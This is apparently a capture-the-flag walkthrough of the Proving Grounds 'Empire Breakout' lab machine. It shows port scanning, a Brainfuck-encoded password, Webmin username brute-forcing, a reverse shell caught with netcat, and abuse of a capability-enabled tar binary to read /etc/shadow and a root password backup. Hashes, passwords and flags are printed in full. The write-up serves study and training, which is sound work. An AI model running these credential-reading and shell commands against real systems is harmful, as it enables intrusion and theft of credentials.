---
title: Empire Breakout
categories: [Proving Grounds Play]
tags: [PrivEsc, SUIDs]
image:
  path: https://i.ytimg.com/vi/avxULb5lELg/maxresdefault.jpg
  alt:  Empire breakout Machine 🖥️
---


## **Description ⤵️**

> 💡 This machine consists of username enumeration through bruteforce then access the webshell after that play with SUIDs comamds for root !
{: .prompt-tip }


### Let’s find the IP Address first >>

```bash
IP : 192.168.164.238
```
{: .nolineno}

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Empire-breakout]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.164.238
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 14:22 IST
Stats: 0:09:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.94% done; ETC: 14:46 (0:14:02 remaining)
Warning: 192.168.164.238 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.164.238
Host is up (0.30s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE    SERVICE    VERSION
80/tcp    open     http       Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
2904/tcp  filtered m2ua
4078/tcp  filtered cssp
9250/tcp  filtered unknown
10000/tcp open     tcpwrapped
12407/tcp filtered unknown
12665/tcp filtered unknown
14359/tcp filtered unknown
14997/tcp filtered unknown
16032/tcp filtered unknown
17092/tcp filtered unknown
19944/tcp filtered unknown
20000/tcp open     http       MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows
22474/tcp filtered unknown
26283/tcp filtered unknown
29720/tcp filtered unknown
31306/tcp filtered unknown
39871/tcp filtered unknown
41579/tcp filtered unknown
55786/tcp filtered unknown
57478/tcp filtered unknown
57725/tcp filtered unknown
62844/tcp filtered unknown
63324/tcp filtered unknown
63436/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1374.00 seconds
```
{: .nolineno}

---

## Web Enumeration ⤵️

Now this machine runs an Apache server After checking the source code I got this →

![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled.png)

After decoding this Brainfuck encoding I got this →

![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled%201.png)

```bash
.2uqPEfj3D<P'a-3
```
{: .nolineno}

Now I also see port 10000 and 20000 open as http-login page lets see →

![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled%202.png)

![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled%203.png)

Now after running burpsuite for username bruteforce I got this on port 20000 →

```bash
cyber : .2uqPEfj3D<P'a-3
```
{: .nolineno}

After Getting password when I logged into the website →

![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled%204.png)

Now I got access for the home directory of cyber user as a web interface →

![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled%205.png)

Now I clicked into the webshell option on top right side and tried reverse shell →

![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled%206.png)

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Empire-breakout]
└─$ nc -lvp 4444
listening on [any] 4444 ...
192.168.164.238: inverse host lookup failed: Unknown host
connect to [192.168.45.219] from (UNKNOWN) [192.168.164.238] 33992
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
cyber@breakout:~$ whoami
whoami
cyber
cyber@breakout:~$ id
id
uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
cyber@breakout:~$
```
{: .nolineno}

Lets see the files →

```bash
cyber@breakout:~$ ls -al
ls -al
total 572
drwxr-xr-x  8 cyber cyber   4096 Jul 15 06:16 .
drwxr-xr-x  3 root  root    4096 Oct 19  2021 ..
-rw-------  1 cyber cyber      0 Oct 20  2021 .bash_history
-rw-r--r--  1 cyber cyber    220 Oct 19  2021 .bash_logout
-rw-r--r--  1 cyber cyber   3526 Oct 19  2021 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19  2021 .filemin
drwx------  2 cyber cyber   4096 Oct 19  2021 .gnupg
drwxr-xr-x  3 cyber cyber   4096 Oct 19  2021 .local
-rw-r--r--  1 root  root      33 Jul 15 04:49 local.txt
-rw-r--r--  1 cyber cyber    807 Oct 19  2021 .profile
-rw-r--r--  1 cyber cyber   3464 Jul 15 06:16 shell.php
drwx------  2 cyber cyber   4096 Oct 19  2021 .spamassassin
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
drwxr-xr-x  2 cyber cyber   4096 Jul 15 06:23 .tmp
drwx------ 17 cyber cyber   4096 Jul 15 06:12 .usermin
cyber@breakout:~$ cat local.txt	
cat local.txt
acff2c9656634fdd92b71c7c91d1e01c
cyber@breakout:~$
```
{: .nolineno}

while checking capabilities I got tar →

```bash
cyber@breakout:/$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
cyber@breakout:/$
```
{: .nolineno}

If I can’t be root directly through executing the payload of tar into the shell so lets try to read the content of root priviledge files through this payload →

```bash
File read >

LFILE=file_to_read
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
```
{: .nolineno}

```bash
cyber@breakout:~$ ./tar xf /etc/shadow -I '/bin/sh -c "cat 1>&2"'      
root:$y$j9T$eJzu0TYuqGwZThJJzbP6o.$Xs23PV9/MdV33YMgceRv1Ic6anL08XclYLE9UX1WiJ6:19381:0:99999:7:::
daemon:*:18919:0:99999:7:::
bin:*:18919:0:99999:7:::
sys:*:18919:0:99999:7:::
sync:*:18919:0:99999:7:::
games:*:18919:0:99999:7:::
man:*:18919:0:99999:7:::
lp:*:18919:0:99999:7:::
mail:*:18919:0:99999:7:::
news:*:18919:0:99999:7:::
uucp:*:18919:0:99999:7:::
proxy:*:18919:0:99999:7:::
www-data:*:18919:0:99999:7:::
backup:*:18919:0:99999:7:::
list:*:18919:0:99999:7:::
irc:*:18919:0:99999:7:::
gnats:*:18919:0:99999:7:::
nobody:*:18919:0:99999:7:::
_apt:*:18919:0:99999:7:::
systemd-timesync:*:18919:0:99999:7:::
systemd-network:*:18919:0:99999:7:::
systemd-resolve:*:18919:0:99999:7:::
messagebus:*:18919:0:99999:7:::
cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:99999:7:::
systemd-coredump:!*:18919::::::
cyber@breakout:~$
```
{: .nolineno}

Now while enumeration I also found a file named as .old.pass.bak but it has root permission so lets try to open that file →

```bash
cyber@breakout:/var/backups$ ls -al                                     
total 484
drwxr-xr-x  2 root root   4096 Dec  8  2022 .
drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
-rw-r--r--  1 root root  40960 Dec  8  2022 alternatives.tar.0
-rw-r--r--  1 root root  12674 Nov 17  2022 apt.extended_states.0
-rw-r--r--  1 root root   1467 Oct 19  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root      0 Dec  8  2022 dpkg.arch.0
-rw-r--r--  1 root root    186 Oct 19  2021 dpkg.diversions.0
-rw-r--r--  1 root root    135 Oct 19  2021 dpkg.statoverride.0
-rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
-rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
cyber@breakout:/var/backups$
```
{: .nolineno}

```bash
cyber@breakout:~$ ./tar xf /var/backups/.old_pass.bak -I '/bin/sh -c "cat 1>&2"'
Ts&4&YurgtRX(=~h
cyber@breakout:~$
```
{: .nolineno}

Now lets use this string value as a password of this root user →

```bash
cyber@breakout:~$ su root
Password: 
root@breakout:/home/cyber# cd /root
root@breakout:~# whoami
root
root@breakout:~# id
uid=0(root) gid=0(root) groups=0(root)
root@breakout:~# ls -al
total 40
drwx------  6 root root 4096 Jul 15 04:50 .
drwxr-xr-x 18 root root 4096 Oct 19  2021 ..
-rw-------  1 root root 1010 Dec 14  2022 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct 19  2021 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   33 Jul 15 04:50 proof.txt
drwx------  2 root root 4096 Oct 19  2021 .spamassassin
drwxr-xr-x  2 root root 4096 Oct 19  2021 .tmp
drwx------  6 root root 4096 Oct 19  2021 .usermin
root@breakout:~# cat proof.txt
d433cb8a51a9d8e36e928a564f71d053
root@breakout:~#
```